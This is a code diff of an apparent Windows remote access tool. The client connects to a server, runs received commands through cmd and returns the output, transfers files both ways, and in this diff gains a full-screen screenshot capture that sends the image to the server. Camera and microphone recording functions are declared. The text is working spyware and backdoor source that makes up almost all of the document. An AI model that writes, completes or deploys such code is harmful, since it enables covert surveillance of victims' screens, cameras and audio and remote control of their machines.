@@ -5,14 +5,14 @@
 int main(int argc, char* argv[]) {
 	WSADATA wsaData;
 	SOCKET connectSocket = INVALID_SOCKET;
-	addrinfo *result = NULL;
-	addrinfo *ptr = NULL;
+	addrinfo* result = NULL;
+	addrinfo* ptr = NULL;
 
 	int iResult;
 
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf("Error WSAStartup %d\n", iResult);
+		printf("[ERROR] WSAStartup %d\n", iResult);
 		return 1;
 	}
 
@@ -21,12 +21,20 @@ int main(int argc, char* argv[]) {
 		char* input = NULL;
 
 		while (1) {
-			input = (char*)calloc(BUFSIZ, sizeof(char));
+			DWORD inputSize = 0;
+			iResult = recv(connectSocket, (char*)&inputSize, sizeof(inputSize), 0);
+			if (iResult < 0) {
+				printf("[ERROR] WSAStartup %d\n", WSAGetLastError());
+				closesocket(connectSocket);
+				WSACleanup();
+				return 1;
+			}
+			input = (char*)calloc(inputSize + 1, sizeof(char));
 
 			if (input) {
-				iResult = recv(connectSocket, input, BUFSIZ, 0);
+				iResult = recv(connectSocket, input, inputSize, 0);
 				if (iResult > 0) {
-					printf("Received command: %s\n", input);
+					printf("[NOTICE] Received command: %s\n", input);
 					BOOL isOption = FALSE;
 					string command = "";
 					string option = "";
@@ -58,6 +66,7 @@ int main(int argc, char* argv[]) {
 					}
 
 					if (command.compare("Screenshot") == 0) {
+						Screenshot(connectSocket);
 					}
 
 					if (command.compare("Camera") == 0) {
@@ -69,7 +78,7 @@ int main(int argc, char* argv[]) {
 
 				}
 				else if (iResult < 0) {
-					printf("Error recv. %d\n", WSAGetLastError());
+					printf("[ERROR] recv. %d\n", WSAGetLastError());
 					free(input);
 					goto ServerDisconnected;
 				}
@@ -77,15 +86,15 @@ int main(int argc, char* argv[]) {
 				free(input);
 			}
 		}
-	ServerDisconnected: {}
+		ServerDisconnected: {}
 	}
 
 
-ClientShutdown:
+	ClientShutdown:
 	// shutdown the connection since no more data will be sent
 	iResult = shutdown(connectSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR) {
-		printf("shutdown failed with error: %d\n", WSAGetLastError());
+		printf("[ERROR] shutdown socket. %d\n", WSAGetLastError());
 		closesocket(connectSocket);
 		WSACleanup();
 		return 1;
@@ -100,7 +109,7 @@ ClientShutdown:
 // wait for server socket and connect
 void waitAndConnect(SOCKET* connectSocket) {
 	int iResult = 0;
-	addrinfo * result = NULL, *ptr = NULL;
+	addrinfo* result = NULL, * ptr = NULL;
 	addrinfo hints;
 
 	ZeroMemory(&hints, sizeof(hints));
@@ -111,7 +120,7 @@ void waitAndConnect(SOCKET* connectSocket) {
 	while (1) {
 		iResult = getaddrinfo(NULL, PORT, &hints, &result);
 		if (iResult != 0) {
-			printf("Error getaddrinfo. %d\n", iResult);
+			printf("[ERROR] getaddrinfo. %d\n", iResult);
 			return;
 		}
 
@@ -119,7 +128,7 @@ void waitAndConnect(SOCKET* connectSocket) {
 		while (ptr) {
 			*connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 			if (*connectSocket == INVALID_SOCKET) {
-				printf("Error socket. %d\n", WSAGetLastError());
+				printf("[ERROR] socket. %d\n", WSAGetLastError());
 				return;
 			}
 
@@ -200,7 +209,7 @@ void sendFile(const char* fileName, SOCKET connectSocket) {
 
 // receive file from server and save
 void receiveFile(const char* fileName, SOCKET connectSocket) {
-	char* buffer = NULL, *filePath = NULL;
+	char* buffer = NULL, * filePath = NULL;
 	HANDLE file = NULL;
 	int iResult = 0;
 	DWORD dwByteWritten = 0;
@@ -257,14 +266,17 @@ void receiveFile(const char* fileName, SOCKET connectSocket) {
 
 		if (file != INVALID_HANDLE_VALUE) {
 			filePath = (char*)calloc(MAX_PATH + 1, sizeof(char));
-			GetFinalPathNameByHandle(file, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
-			printf("File saved at %s\n", filePath);
-			free(filePath);
+			if (filePath) {
+				GetFinalPathNameByHandle(file, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
+				printf("File saved at %s\n", filePath);
+				free(filePath);
+			}
 		}
 		CloseHandle(file);
 	}
 }
 
+// Execute command and send output to server
 void doCommandAndSend(const char* command, SOCKET connectSocket) {
 	HANDLE hStdInPipeRead = NULL;
 	HANDLE hStdInPipeWrite = NULL;
@@ -297,6 +309,10 @@ void doCommandAndSend(const char* command, SOCKET connectSocket) {
 	PROCESS_INFORMATION pi = {};
 
 	char* tempCommand = (char*)calloc(strlen(command), sizeof(char));
+	if (!tempCommand) {
+		printf("[ERROR] allocate.\n");
+		return;
+	}
 	tempCommand = strcat(tempCommand, "/c ");
 	tempCommand = strcat(tempCommand, command);
 
@@ -322,23 +338,31 @@ void doCommandAndSend(const char* command, SOCKET connectSocket) {
 		dwByteRead = 0;
 		if (buffer) {
 			ok = ReadFile(hStdOutPipeRead, buffer, BUFSIZ, &dwByteRead, NULL);
-			if (ok) {
-				//send output size
-				int iResult = send(connectSocket, (char*)&dwByteRead, sizeof(dwByteRead), 0);
-				if (iResult < 0) {
-					printf("[ERROR] send command output size. %d\n", WSAGetLastError());
-					free(buffer);
-					goto cleanup;
-				}
 
+			// if pipe can be read, send file data. or else send 0 as end of data indicator.
+
+			//send output size
+			int iResult = send(connectSocket, (char*)&dwByteRead, sizeof(dwByteRead), 0);
+			if (iResult < 0) {
+				printf("[ERROR] send command output size. %d\n", WSAGetLastError());
+				free(buffer);
+				goto cleanup;
+			}
+
+			if (ok && dwByteRead > 0) {
 				//send output
 				if (dwByteRead != 0) {
-					int iResult = send(connectSocket, buffer, dwByteRead, 0);
-					if (iResult < 0) {
-						printf("[ERROR] send command output. %d\n", WSAGetLastError());
-						free(buffer);
-						goto cleanup;
-					}
+					do {
+						int iResult = send(connectSocket, buffer, dwByteRead, 0);
+						if (iResult < 0) {
+							printf("[ERROR] send command output. %d\n", WSAGetLastError());
+							free(buffer);
+							goto cleanup;
+						}
+						dwByteRead -= iResult;
+
+					} while (dwByteRead > 0);
+
 				}
 			}
 
@@ -346,8 +370,153 @@ void doCommandAndSend(const char* command, SOCKET connectSocket) {
 		}
 	} while (ok == TRUE);
 
-cleanup:
+	cleanup:
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 	CloseHandle(hStdInPipeWrite);
 	CloseHandle(hStdOutPipeRead);
 	return;
+}
+
+// Take screenshot and send file to server
+void Screenshot(SOCKET connectSocket) {
+	HDC hScreenDC = NULL, hMemoryDC = NULL;
+	int width = 0, height = 0;
+	HBITMAP hBitmap = NULL, hOldBitmap = NULL;
+	BITMAP bitmap = {};
+	BITMAPFILEHEADER   bmpFileHeader = {};
+	BITMAPINFOHEADER   bmpInfoHeader = {};
+	int iResult = 0;
+	BOOL ok = TRUE;
+
+
+	// Get device context
+	hScreenDC = GetDC(nullptr);
+	ok &= hScreenDC != NULL;
+	hMemoryDC = CreateCompatibleDC(hScreenDC);
+	ok &= hMemoryDC != NULL;
+
+	if (ok) {
+		// get screen size
+		width = GetDeviceCaps(hScreenDC, HORZRES);
+		height = GetDeviceCaps(hScreenDC, VERTRES);
+
+		// create bitmap
+		hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+		ok &= hBitmap != NULL;
+
+		if (hMemoryDC && hBitmap) {
+			hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+			ok &= hOldBitmap != NULL && hOldBitmap != HGDI_ERROR;
+
+		}
+
+		// copy device context to bitmap
+		if (hMemoryDC) {
+			ok &= 0 != BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
+		}
+
+		//get bitmap from handle
+		if (hBitmap) {
+			ok &= 0 != GetObject(hBitmap, sizeof(BITMAP), &bitmap);
+		}
+
+		DWORD dwBmpSize = bitmap.bmWidth * bitmap.bmHeight * 4; // 4 bytes aka 32 bits per pixel
+
+		//set bitmap file header
+		bmpFileHeader.bfType = 0x4D42; // BM.
+		bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+		bmpFileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
+
+		// set bitmap info header
+		bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
+		bmpInfoHeader.biWidth = bitmap.bmWidth;
+		bmpInfoHeader.biHeight = bitmap.bmHeight;
+		bmpInfoHeader.biPlanes = 1;
+		bmpInfoHeader.biBitCount = 32;
+		bmpInfoHeader.biCompression = BI_RGB;
+		bmpInfoHeader.biSizeImage = 0;
+		bmpInfoHeader.biXPelsPerMeter = 0;
+		bmpInfoHeader.biYPelsPerMeter = 0;
+		bmpInfoHeader.biClrUsed = 0;
+		bmpInfoHeader.biClrImportant = 0;
+
+		char* bmpData = (char*)calloc(dwBmpSize, sizeof(char));
+		ok = bmpData != NULL;
+
+		if (bmpData) {
+			// get screenshot data from bitmap
+
+			iResult = GetDIBits(hScreenDC, hBitmap, 0, (UINT)bitmap.bmHeight, bmpData, (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
+			ok = iResult != 0 && iResult != ERROR_INVALID_PARAMETER;
+
+			//send ok signal
+			sendSignal(ok, connectSocket);
+
+
+			if (ok) {
+				//send file size
+				iResult = send(connectSocket, (char*)&bmpFileHeader.bfSize, sizeof(bmpFileHeader.bfSize), 0);
+				if (iResult <= 0) {
+					printf("[ERROR] send. %d\n", WSAGetLastError());
+					return;
+				}
+
+				//send file header
+				iResult = send(connectSocket, (char*)&bmpFileHeader, sizeof(BITMAPFILEHEADER), 0);
+				if (iResult < 0) {
+					printf("[ERROR] send. %d\n", WSAGetLastError());
+					return;
+				}
+
+
+				//send info header
+				iResult = send(connectSocket, (char*)&bmpInfoHeader, sizeof(BITMAPINFOHEADER), 0);
+				if (iResult < 0) {
+					printf("[ERROR] send. %d\n", WSAGetLastError());
+					return;
+				}
+
+				//send bitmap data
+				int remaining = dwBmpSize;
+				char* ptr = bmpData;
+				while (remaining > 0) {
+					iResult = send(connectSocket, ptr, BUFSIZ, 0);
+					if (iResult > 0) {
+						ptr += iResult;
+						remaining -= iResult;
+					}
+					else {
+						printf("[ERROR] send. %d\n", WSAGetLastError());
+						return;
+					}
+				}
+			}
+
+			free(bmpData);
+		}
+		else {
+			//send fail signal
+			sendSignal(ok, connectSocket);
+		}
+
+		// restore bitmap
+		if (hOldBitmap) SelectObject(hMemoryDC, hOldBitmap);
+
+		DeleteDC(hMemoryDC);
+		DeleteDC(hScreenDC);
+	}
+}
+
+// Start recording and send file to server
+void Micro(int milliseconds, SOCKET connectSocket);
+
+// Take camera picture and send file to server
+void Camera(SOCKET connectSocket);
+
+void sendSignal(BOOL signal, SOCKET connectSocket) {
+	if (send(connectSocket, (char*)&signal, sizeof(signal), 0) < 0) {
+		printf("[ERROR] send signal failed. %d\n", WSAGetLastError());
+		return;
+	}
 }
